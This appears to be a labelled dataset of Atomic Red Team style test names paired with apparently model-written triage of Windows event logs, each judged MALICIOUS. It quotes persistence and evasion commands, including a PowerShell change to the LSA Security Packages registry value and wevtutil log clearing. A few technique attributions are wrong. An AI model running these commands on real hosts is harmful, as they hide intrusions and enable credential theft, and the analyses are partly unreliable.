- **MALICIOUS**: The actions present in these logs strongly suggest malicious activity. Immediate steps should be taken to contain and mitigate any potential threats:
  1. **Containment**: Isolate the affected system (Server002) from the network to prevent further spread of potential threats.
  2. **Eradication and Recovery**: Conduct a thorough forensic investigation to understand the full scope of the breach and ensure any backdoors or persistence mechanisms are removed. Rebuild potentially compromised systems if necessary.
  3. **Monitoring and Detection**: Enhance monitoring and detection capabilities to identify similar suspicious activity in the future, especially unusual use of system tools and administrative commands.
  4. **Review and Harden**: Evaluate the security posture and harden the environment against similar attacks by implementing stricter user permissions, audit logging, and anomaly detection mechanisms."
Azure - adding service principal to Azure role in subscription,"Upon reviewing the provided Windows event logs, several pieces of evidence suggest potentially malicious activities:

1. **PowerShell use:** 
   - The PowerShell command attempts to connect to an Azure account and manage roles. Although this might be a legitimate administrative action, the use of hardcoded credentials (`p4sswd`) in a script is risky and unconventional for most secure scripting environments.
   - The PowerShell script attempts to create a new Azure role assignment. If this was done without prior knowledge or authorization, it could be a sign of malicious activity, particularly if privilege escalation is involved.

2. **Event Log Clearing:**
   - Security Log Event ID 1102 and System Log Event ID 104 indicate that the logs were cleared by a user `admin_test`. This is generally a significant red flag because attackers often clear logs to erase traces of unauthorized or malicious activity.

3. **Usage of `wevtutil` tool:**
   - The Sysmon logs show multiple executions of the `wevtutil` command to clear logs for various channels such as Sysmon, Application, System, and Security. This correlation with log clearing events strongly suggests an attempt to cover tracks, typically indicative of malicious behavior.

4. **CompatTelRunner.exe Execution:**
   - The Security logs contain multiple Event ID 4798 entries involving `CompatTelRunner.exe`, which lists all user accounts. This is unusual because this executable is generally related to telemetry and not user account enumeration. It might be leveraged maliciously for privilege discovery.

5. **Privileged Access:**
   - The Security log entries with Event ID 4672 mention various high-level privileges being claimed by the `SYSTEM` account. The presence of `SeDebugPrivilege` and related privileges could be abused for privilege escalation or other nefarious activities.

**Conclusion:**
The combination of PowerShell usage with hardcoded credentials, event log clearing, unusual usage of telemetry executables for enumeration of user accounts, and high-level privileged usage by system processes leads to a strong suspicion of malicious activity.

**Final Resolution: MALICIOUS**
Given the evidence of log clearing, potential unauthorized PowerShell script execution, and system file misuse, these logs exhibit behavior associated with a potential compromise. Immediate investigation and mitigation actions should be initiated, including reviewing user activity, potentially rebuilding the affected host, and auditing Azure usage to ensure no unauthorized access or modifications have occurred."
TinyTurla backdoor service w64time,"Upon analyzing the given Windows event logs, several events stand out as indicative of potentially malicious activity, suggesting a compromise of the system. Here's a detailed breakdown:

1. **Event Log Clearing:**
   - Multiple instances of `wevtutil.exe` usage are observed in the logs to clear key Windows Event Logs: Security, System, and Windows PowerShell. This is a common tactic used by attackers to erase their footprints after conducting malicious activities (Event IDs: 1102 in Security log, 104 in System log).

2. **Service Creation and Configuration:**
   - The logs include evidence of command-line operations consistent with persistence techniques. Specifically, a service named ""W64Time"" is created using `sc.exe` with a configuration to run under the guise of a legitimate service (Event IDs: 7045 in System log; corresponding Sysmon events show the associated process creations and command lines).
   - The command used is highly suspicious: it involves copying a DLL file (`w64time.dll`) from a temporary directory associated with ""AtomicRedTeam,"" a known repository of adversary simulation activities, to the system32 directory, alongside registry modifications and service start commands.

3. **Privilege Escalation:**
   - Anomalous privilege assignment is noted in the Security logs, with the `admin_test` user being granted extensive privileges that include debugging, restoring, and system environment adjustments (`Event ID: 4672`).

4. **Time Manipulation:**
   - There's evidence of the system time being altered twice in quick succession, which could be indicative of an attacker attempting to disrupt normal logging or script execution flow (Event IDs: 4616 in Security log and 1 in System log).

5. **Execution of PowerShell and System Utilities:**
   - `cmd.exe` instances executed command strings that simulate and replicate real-world attack scenarios—compiling and deploying a payload (in this case, a rogue DLL) using native Windows utilities.

Overall, the series of actions discussed are highly indicative of a compromise. These include footprint erasure, unauthorized service creation, and privilege escalation using native Windows utilities—behaviors aligned with adversarial tactics for persistence and evasion.

**Final Assessment: MALICIOUS**

**Recommended Actions:**
- Immediately isolate the affected system from the network to prevent further spread or exfiltration.
- Conduct a thorough forensic investigation to understand the scope and origin of the breach.
- Review and secure all accounts with administrative privileges, paying special attention to `admin_test`.
- Implement stringent logging and monitoring controls to capture potential future anomaly and malicious behavior.
- Assess whether there has been any unauthorized data access or exfiltration as part of the investigation."
Create shortcut to cmd in startup folders,"Based on the detailed analysis of the Windows event logs, below are the key findings that indicate suspicious or potentially malicious activities:

### Anomalous Behavior Analysis:
1. **Event Log Clearing (System and Security Logs Cleared):**
   - Multiple instances of log clearing actions were identified in the logs, executed by the user `admin_test`. Specifically, Event ID 104 from the System log and Event ID 1102 from the Security log indicate that logs were cleared. Clearing event logs is a typical tactic used by malicious actors to cover their tracks after conducting unauthorized activities.

2. **Suspicious PowerShell Command Execution:**
   - An unusually complex PowerShell script was executed, as evident from the PowerShell logs. The script attempts to create shortcuts in the startup folders pointing to `cmd.exe`, likely to establish persistence using a technique associated with MITRE ATT&CK T1547.009 (Shortcut Modification).

3. **Time Change Events:**
   - There are multiple instances of time change events (Event ID 4616 in the Security log), which might indicate an attempt to manipulate time-related logs or bypass time-based security controls.

4. **Process Creation and Execution:**
   - There is a pattern of spawning and utilizing common administrative utilities (`wevtutil`, `hostname.exe`, `whoami.exe`) that can be benign under normal circumstances, but potentially suspicious in correlation with other activities like log clearing and PowerShell script executions.

5. **Unusual Use of Command Line Arguments:**
   - Specifically, the PowerShell command executed contains multiple commands concatenated with shortcut creation which is atypical of standard PowerShell usage for administrative tasks.

### Assessment:
The logs reveal activities consistent with attempts to hide actions on the system:
- **Log clearing events** imply attempts to remove traces.
- **PowerShell execution** with intent to alter system startup configurations suggests a persistence mechanism.
- These combined patterns are generally indicative of a sophisticated attack, often associated with lateral movement and data exfiltration preparation.

### Conclusion:
Based on the above findings, the activities captured in the logs strongly suggest malicious intent. The combination of event log manipulation and persistence through startup modification underscores a potential security breach.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate the affected host from the network to prevent any further potential spread or data exfiltration.

2. **In-depth Forensic Analysis:**
   - Conduct comprehensive digital forensic analysis to uncover any further evidence of compromise and capture a timeline of attacker activities.

3. **Review and Strengthen Security Measures:**
   - Implement stricter controls on the use of administrative accounts, and monitor PowerShell execution rigorously.
   - Ensure logging and monitoring systems are functioning to capture detailed security information, re-enable logging if disabled, and secure log records from further tampering.

4. **Incident Response:**
   - Follow your organization's incident response plan, notifying relevant internal and external parties.
   - Prepare to restore system integrity through backups or full remediation activities.

5. **User Awareness and Training:**
   - Provide training sessions to users to recognize potentially malicious activities and phishing attempts that might lead to unauthorized access.

By addressing these immediate concerns, you can contain and mitigate the potential impact of the identified malicious activities."
Edit an existing time provider,"### Analysis of Windows Event Logs

#### Overview
The logs provided from the Windows host (Server002) were examined for any suspicious activity. Various logs including Application, Sysmon, Windows PowerShell, and Security were scrutinized to identify signs of potential malicious activity.

#### Findings

1. **Process Execution and Command-Line Arguments**:
    - Multiple executions of `wevtutil.exe` from a high-integrity environment by the `admin_test` user were observed. Usage of `wevtutil.exe` is standard for system events manipulation but the volume and consistency hint at potential log manipulation or clearing attempts.
    - A concerning entry is the execution of `powershell.exe` with a command to perform tasks often associated with post-exploitation activities. The PowerShell script attempts to stop a service, drop a DLL, modify registry keys related to `W32Time` (time service), and restart the service. This is indicative of a persistence mechanism or privilege escalation attempt, using known techniques (e.g., T1547.003 Service Registry Permissions Weakness from MITRE ATT&CK).

2. **Log Clearing Events**:
    - The Security, System, and Windows PowerShell logs were cleared by the `admin_test` user (Security Event ID 1102, System Event ID 104). Log clearing is a significant indicator of malicious activity as adversaries frequently clear logs to evade detection post-compromise.

3. **Service and Privilege Escalation**:
    - The script modifies the `NtpServer` settings within the Windows Time service, which can potentially be used to execute malicious DLLs under the system's service context, indicating an attempt to escalate privileges and maintain persistence.

4. **Anomalies in Time Events**:
    - The security logs show time discrepancies (Security Event ID 4616), generally associated with time manipulation, which can be an attempt to confuse log timelines and further hinder forensic analysis.

5. **Edge Update and Other Services**:
    - Frequent updates or executions related to `MicrosoftEdgeUpdate` are observed. Although Edge updates might be benign, juxtaposed with the abnormal PowerShell activities, further scrutiny is warranted to rule out misuse within the broader context of the anomalies recorded.

#### Conclusion

Based on the above findings, there are strong indicators of **MALICIOUS** activity:

- The execution of PowerShell with a suspicious script modifying critical registry paths and service configurations.
- Sysmon logs and clear commands showing potential exploratory or malicious activity in the form of log clearance, a known tactic to erase tracks.
- Registry manipulations hint at potential persistence mechanisms.

#### Recommendation

- **Immediate Incident Response**: Quarantine the affected machine to prevent further propagation of malicious intents or footholds.
- **Forensic Analysis**: Perform a detailed forensic investigation, including checking the integrity of time service configurations, additional registry footholds, and verifying the authenticity of any dropped or replaced DLL files.
- **User Activity Review**: Consider reviewing `admin_test` user activity and potential credential misuse or compromise.
- **Security Hardening and Monitoring**: Ensure monitoring tools are in place for such registry changes and unusual PowerShell script behaviors, and review security posture across similar servers.

Final Resolution: **MALICIOUS**"
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"Upon analyzing the provided event logs, I have identified several points of potential concern, which are detailed below:

1. **PowerShell Activity**: 
   - A PowerShell script has been executed that modifies registry settings related to `Security Packages` in the HKLM (HKEY_LOCAL_MACHINE) registry hive. The script sets a new value ""AtomicTest.dll"". This activity is suspicious as it indicates possible tampering with Windows authentication processes, which could be a sign of credential theft attempts or other malicious intent.

   Example from the Sysmon log and corroborated by the PowerShell log:
   ```
   CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');, Set-ItemProperty -Path \""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\"" -Name 'Security Packages old' -Value \""$oldvalue\"", $newvalue = \""AtomicTest.dll\"", Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue}.
   ```

2. **Event Log Clearing**:
   - The event logs for the System, Security, and Windows PowerShell channels have been cleared by the user `admin_test`. This could be an indication of an attempt to cover up tracks as log clearing is a common practice post-compromise behavior.

   Examples from the System and Security logs:
   ```
   Event ID 104 & 1102, LogFileCleared: SubjectUserName: admin_test, Channel: System, Security, Windows PowerShell
   ```

3. **Unusual Application Logs**:
   - The `edgeupdate` service appears frequently with various execution paths, including from temporary directories, which should be closely scrutinized as it may hint at masquerading techniques or misuse of legitimate software for malicious purposes.

   Example from the Sysmon log:
   ```
   Image: ""C:\\Program Files (x86)\\Microsoft\\Temp\\EU4D4B.tmp\\MicrosoftEdgeUpdate.exe"".
   ```

4. **Kernel Time Changes**:
   - There are multiple event log entries related to time changes on the system. While these could be benign, they may also indicate attempts to manipulate system time for various malicious activities.

   Example from the Security log:
   ```
   Event ID 4616, PreviousTime: 2024-10-27 16:50:50, NewTime: 2024-10-27 16:51:08
   ```

**Assessment and Conclusion**:
- Based on the activities observed, particularly the unauthorized PowerShell registry manipulation and log clearing, there is substantial evidence of potentially malicious activity.

- **Resolution**: **MALICIOUS**. The presence of PowerShell exploitation attempts and actions to clear event logs suggests an active attack likely aimed at compromising the system or elevating privileges. Immediate response actions are recommended.

**Guidance to Proceed**:
1. Isolate the affected host from the network to prevent potential lateral movement.
2. Conduct a thorough investigation to determine the exact scope and impact.
3. Analyze persistence mechanisms and remove unauthorized changes, especially in registry settings.
4. Consider restoring the system from a trusted backup if the integrity of the system is too compromised.
5. Implement enhanced monitoring and review related systems for indicators of compromise (IoC).

These steps are crucial to address the observed issues and to bolster defenses against future threats."
HKLM - Append Command to Winlogon Userinit KEY Value,"### Detailed Analysis:

#### 1. **Event Log Clearing (System and Security Logs)**:
- **System Log EventID 104 and Security Log EventID 1102**:
  - **EventID 104** indicates that the event log was cleared. This occurred for both the System and Windows PowerShell channels. Such actions, especially when performed without a direct requirement or explanation, can be indicative of an attempt to cover tracks.
  - **EventID 1102** in the Security log indicates that the security log was cleared. This is often seen as an attempt to hide unauthorized or malicious activities. The user responsible, ""admin_test,"" initiated these actions, showing high privileges.

#### 2. **Modification of Winlogon Userinit Registry Key (PowerShell Log)**:
- The PowerShell logs show commands executed to modify the `Userinit` registry key to include `calc.exe` (`C:\Windows\System32\calc.exe`). This modification is unusual and indicative of a persistence mechanism often used by malware to execute unauthorized commands or scripts upon user login.

#### 3. **Process Execution (Sysmon Log)**:
- **wevtutil.exe Execution**:
  - The logs show multiple instances of `wevtutil.exe` being used to clear logs across various channels: Sysmon, Application, and System logs. This aligns with the earlier observation of log clearing.
  - The presence of `conhost.exe` linked to these instances indicates command-line executions, possibly tied to malicious script execution or process manipulation.

- **PowerShell Execution with Suspicious Commands**:
  - The Sysmon logs show `powershell.exe` running scripts to manipulate the registry (as detailed in the PowerShell section). This matches the behavior seen in the PowerShell logs.

#### 4. **Legitimate Software Updates (Application and Sysmon Logs)**:
- **Microsoft Edge Update**:
  - The application logs indicate normal behavior for updating Microsoft Edge, executed by processes running under `NT AUTHORITY\SYSTEM`. While benign in nature, it serves as background noise within the investigation.

### Assessment:

The logs display several clear indicators of potentially malicious activity:
- **Unexplained Clearing of Logs**: Both the system and security logs were cleared by an administrative user. This typically attempts to erase evidence of unauthorized or malicious activity.
- **Registry Key Changes**: The use of PowerShell to alter the `Userinit` registry key suggests malicious persistence techniques.
- **Privilege Use and Command-line Executions**: The evidence of `wevtutil.exe` and PowerShell usage suggests attempts at both process execution and direct log manipulation by a highly privileged account.

### Recommendation and Resolution:

Given the combination of the above factors, this log activity should be considered **MALICIOUS**. Immediate actions should include:
- **Forensic Analysis**: Conduct a deeper forensic investigation of the host and associated systems to identify any malware or unauthorized backdoors.
- **User Account Review**: Verify the activities and permissions of the ""admin_test"" account.
- **Systems Monitoring**: Increase monitoring of event logs across systems for similar activities.
- **Malware Scan**: Conduct a comprehensive malware scan across the network to identify other potentially affected hosts.
- **Security Audit**: Review and tighten security policies related to logging and administrative actions.

In summary, logs present strong evidence of malicious activity requiring urgent attention and further incident response protocols."
Azure AD Application Hijacking - Service Principal,"Upon analyzing the provided event logs, the following observations have been made which indicate potentially malicious activity:

1. **Clearing of Event Logs**: 
   - **System Log**: Event ID 104 shows that the ""System"" and ""Windows PowerShell"" event logs were cleared by the user ""admin_test"".
   - **Security Log**: Event ID 1102 indicates that the ""Security"" log was cleared by ""admin_test"".

   Clearing of logs is a suspicious activity typically performed to hide malicious actions.

2. **PowerShell Execution**:
   - The PowerShell logs indicate the execution of a script that involves importing the AzureAD module, creating a PSCredential object with a hardcoded password, and attempting to connect to AzureAD using this credential. There is also the generation of a self-signed certificate and attempted manipulation of service principal credentials.
   
   The script comments hint at an ""Application Hijacking"" attempt which is a common tactic used by malicious actors to gain unauthorized access to applications or services.

3. **Execution of Sysinternals Tools**:
   - **Sysmon Logs**: There are multiple instances of the `wevtutil.exe` command being used to clear logs (""cl"" command) across various channels (""System"", ""Security"", ""Application"", ""Windows PowerShell""). This further corroborates an attempt to cover tracks by log deletion.

4. **Anomalous Process Executions**:
   - The execution of `wevtutil.exe`, `whoami.exe`, and `hostname.exe` suggest potential reconnaissance or system information gathering activities post-intrusion.

Based on these observations, the collective evidence of log manipulation and suspicious PowerShell activity strongly indicates malicious behavior.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) to prevent further potential compromise.

Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided log entries, the following observations regarding suspicious or anomalous behavior have been noted:

1. **Clearing of Event Logs:**
   - Multiple log entries show event logs being cleared by the user `admin_test`. The `wevtutil` command is used to clear logs, as seen in these entries. Clearing event logs can be a sign of malicious activity, as it is a common tactic used by attackers to cover tracks. The event logs cleared include:
     - System Log (`EventID: 104`)
     - Security Log (`EventID: 1102`)
     - Windows PowerShell Log (`EventID: 104` for Windows PowerShell channel)

2. **Suspicious Registry Modification:**
   - A command `cmd.exe /c reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram` is executed with the intention to modify the registry. It attempts to set the image path to `C:\\Program Files\\Internet Explorer\\iexplore.exe`. Unauthorized registry modifications are a potential indicator of malicious activity, especially if related to persistence mechanisms.

3. **Time Manipulation:**
   - There are events related to the time change on the system (`EventID: 4616`), where previous and new times are different. Such manipulations can be indicative of attempts to manipulate system time for evasion purposes.

4. **High Privileged Activity by `admin_test`:**
   - The user `admin_test` has several high privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` (`EventID: 4672`). These privileges could be leveraged for malicious purposes, especially if misused by an attacker.

5. **Processes with High Integrity Level:**
   - Processes executed by the user `SERVER002\\admin_test` show a high integrity level, indicating potentially high privileges. Multiple instances of `wevtutil.exe` are observed performing operations like clearing logs.

6. **Frequent Execution of System Utilities:**
   - The frequent execution of commands like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` by the `admin_test` user suggests an unusual level of command-line and process activity that could indicate scripting or the presence of an attacker manually interacting with the system.

Given these observations:

- The combination of cleared event logs, registry modifications, and command-line activity, especially by a user with significant privileges, suggests likely malicious intent.

Resolution: **MALICIOUS**
